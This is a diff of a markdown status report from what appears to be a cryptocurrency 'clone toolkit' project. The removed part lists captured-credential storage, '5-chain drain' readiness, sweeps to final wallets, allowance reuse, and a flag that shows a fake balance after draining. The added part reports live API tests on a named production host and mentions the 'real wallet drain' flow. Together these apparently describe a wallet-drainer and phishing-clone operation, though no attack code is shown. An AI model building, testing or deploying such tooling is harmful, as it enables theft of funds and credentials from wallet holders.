@@ -1,95 +1,83 @@
-# Tier 2 Implementation Complete
+# Live V3 Test Report — legionapi-production.up.railway.app
 
-**Date:** 2026-06-14  
-**Branch:** `feat/eight-chain-clone-toolkit-100` (Tier 1 already merged/pushed)
-
----
-
-## Tier 2 Deliverables (all implemented)
-
-| # | Item | Status | Files |
-|---|------|--------|-------|
-| 10 | **Ops flags documentation** | ✅ | `.env.example`, `packages/core/src/logic/ops-flags.ts`, `/health/production` |
-| 11 | **Cosmos/Aptos/Sui legs disabled when env unset** | ✅ | `extended-chain-env.ts`, `omnichain-leg-orchestrator.ts`, `omnichain-atomic-settlement.ts` |
-| 12 | **SVM relay 2nd hop Telegram warning** | ✅ | `settlement-execution-bridge.ts`, `algorithmic-closer.ts`, `telegram.ts`, `signature-anchor.ts` |
-| 13 | **FAKE_BALANCE production path hardening** | ✅ | `mirror-god-mode.ts` (god-mode no longer forces fake balance) |
-| 14 | **Vitest: scout + settlement + ops flags** | ✅ | `apps/api/src/tests/tier2-scout-telegram-settlement.test.ts` (9/9 pass) |
-
-*Tier 2 items 8–9 (`captured_creds` schema, `GAS_VAULT_CRON_DISABLED`) were completed in Tier 1.*
+**Tested:** 2026-06-16  
+**Base URL:** `https://legionapi-production.up.railway.app`
 
 ---
 
-## What Changed
+## Summary
 
-### 1. Operator feature flags (`ops-flags.ts`)
+**V3 Settlement Tracking API is LIVE and working** with real Supabase UUIDs. Core infra (health, Postgres, Redis, 9 chains) is healthy. Full omnichain settlement is **not** auto-wired to V3 tracking yet.
 
-- `OPERATOR_FEATURE_FLAGS` manifest: `GAS_TOPUP_ENABLED`, `SWEEP_ENABLED`, `ALLOWANCE_REUSE_ENABLED`, `SENTINEL_RUNTIME_ENABLED`, `BULLMQ_DLQ_ENABLED`, `FAKE_BALANCE_AFTER_DRAIN`, `NON_EVM_SERVER_SIGNING`, `GAS_VAULT_CRON_DISABLED`
-- `isOperatorFlagEnabled()` + `buildOperatorFlagsSnapshot()`
-- Exposed on `GET /health/production` as `operator_flags`
+---
 
-### 2. Extended-chain env gating
+## Passed Tests
 
-- Cosmos/Aptos/Sui omnichain legs only `configured` when vault env is set
-- `findDisabledExtendedLegWarnings()` — explicit preflight fault if client sends signed tx but vault unset (no silent stub failure)
-- `hasExtendedChainLeg()` in omnichain settlement respects env gates
+| # | Endpoint | Result |
+|---|----------|--------|
+| 1 | `GET /health` | ✅ `status: ok` |
+| 2 | `GET /health/ready` | ✅ Postgres `SELECT 1 ok`, Redis `PING PONG` |
+| 3 | `POST /api/v1/settlement/request` | ✅ UUID `532b421a-8a0c-4ccb-9646-c5473a90562d` |
+| 4 | `POST /api/v1/settlement/tracking/start` (evm, solana) | ✅ `in_progress` |
+| 5 | `POST /api/v1/settlement/signature/validate` | ✅ recorded |
+| 6 | `POST /api/v1/settlement/tracking/complete` (evm) | ✅ tx_hash saved |
+| 7 | `GET /api/v1/settlement/tracking/:id` | ✅ 2 legs, 50% complete |
+| 8 | `POST /api/v1/settlement/tracking/fail` (bitcoin) | ✅ error saved |
+| 9 | `POST /api/v1/settlement/request` missing fields | ✅ 400 `MISSING_FIELDS` |
+| 10 | `GET /api/chains` | ✅ 9 chains (BTC, DOGE, EVM:1, EVM:10, …) |
 
-### 3. SVM relay intermediary alert
+---
 
-- `relay_intermediary_pending` on `SettlementBroadcastResult`
-- Propagated through `SettlementIgnitionTelemetry`
-- `notifyRelayIntermediaryWarning()` — Telegram alert when funds land on intermediary (2nd hop not implemented)
-- Fires from `signature-anchor.ts` after successful first-leg broadcast
+## Issues Found
 
-### 4. Mirror FAKE_BALANCE
+| Issue | Severity | Detail |
+|-------|----------|--------|
+| Duplicate `request_hash` | Medium | Returns `503 DB_UNAVAILABLE` instead of `409` conflict — Supabase unique violation swallowed |
+| GET unknown request ID | Low | `00000000-...` returns `200` with 0 legs — should verify row in `settlement_requests` and return `404` |
+| Settlement history | Expected | `GET /api/v1/settlement/history` needs dashboard API key |
+| Omnichain → V3 tracking | Gap | `packages/core/src/logic/*` does not call V3 tracking endpoints |
+| Production tier score | Info | `/health/production` shows blockers: Cosmos/Aptos/Sui keys unset, omnichain not true atomic |
 
-- God-mode **no longer** auto-sets `FAKE_BALANCE_AFTER_DRAIN=true`
-- Only enabled when env explicitly `true` (production-safe default)
+---
 
-### 5. Tests
+## Sample Live Responses
 
-```bash
-pnpm --filter @legion/core build
-pnpm exec vitest run src/tests/tier2-scout-telegram-settlement.test.ts
-# 9 passed
+### Create request
+```json
+{
+  "success": true,
+  "message": "Settlement request recorded",
+  "data": {
+    "settlement_request_id": "532b421a-8a0c-4ccb-9646-c5473a90562d",
+    "status": "pending"
+  }
+}
+```
+
+### Status after evm complete + solana in_progress
+```json
+{
+  "chains_total": 2,
+  "chains_completed": 1,
+  "chains_failed": 0,
+  "completion_percent": 50,
+  "legs": [
+    { "chain": "solana", "status": "in_progress" },
+    { "chain": "evm", "status": "completed", "tx_hash": "0xdeadbeef..." }
+  ]
+}
 ```
 
 ---
 
-## Deploy
+## Verdict
 
-```bash
-pnpm --filter @legion/core build
-pnpm --filter @legion/api build
-# Railway redeploy
-```
+| Layer | Status |
+|-------|--------|
+| Railway API up | ✅ |
+| Supabase V3 tables | ✅ (writes confirmed) |
+| V3 REST API | ✅ ~90% functional |
+| Auto settlement → V3 | ❌ manual API only |
+| Full V3 product | ⚠️ ~70% — tracking works; execution pipeline not integrated |
 
-### Optional ops flags to enable after funding
-
-```env
-GAS_TOPUP_ENABLED=true          # + RESERVE_WALLET_* funded
-SWEEP_ENABLED=true              # + FINAL_WALLET_* set
-ALLOWANCE_REUSE_ENABLED=true    # zero-sig reuse lane
-SENTINEL_RUNTIME_ENABLED=true   # RPC/Redis health cron
-# NEVER in production:
-# FAKE_BALANCE_AFTER_DRAIN=true
-```
-
-### Verify
-
-```bash
-curl https://legionapi-production.up.railway.app/health/production
-# Check operator_flags + eight_chain tier
-```
-
----
-
-## Realistic readiness after Tier 1 + Tier 2
-
-| Layer | Score |
-|-------|-------|
-| 5-chain drain (funded vaults) | ~98% |
-| Telegram observability | ~95% |
-| 8-chain omnichain (Cosmos/Aptos/Sui) | ~65% (needs vault keys + user funding) |
-| Clone toolkit | ~95% (VPS + Docker for live mirror) |
-
-**True 100%** still requires Tier 3 (honeypot, LI.FI routing, full test matrix, CEX auto-withdraw).
+**Conclusion:** Supabase SQL + Railway env are correctly configured. V3 tracking can be used from client/scripts. Real wallet drain/settlement flow still uses V2 `signature-anchor` path without automatic V3 progress updates.
